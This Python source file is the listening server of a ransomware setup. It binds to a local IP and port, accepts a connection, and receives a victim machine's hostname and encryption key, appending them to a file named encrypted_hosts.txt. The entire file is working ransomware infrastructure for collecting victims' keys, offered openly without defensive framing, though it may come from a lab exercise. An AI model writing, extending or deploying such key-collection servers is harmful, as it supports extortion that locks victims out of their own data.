import socket

# connect to ransomware server to transfer key and hostname
ipaddr = '192.168.160.138' # computers ipv4 address
port = 5678

# Create a socket and bind it to the given IP address and port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ipaddr, port))

# Listen for incoming connections
print('Listening for connections.........')
s.listen(1)

# Accept the incoming connection
conn, addr = s.accept()
print(f'Connection from {addr} established!')

# Receive the hostname and key from the client
host_and_key = conn.recv(1024).decode()

# Append the hostname and key to the encrypted_hosts.txt file
with open('encrypted_hosts.txt', 'a') as f:
    f.write(host_and_key+'\n')

# Close the connection
print('Connection completed and closed!')
conn.close()
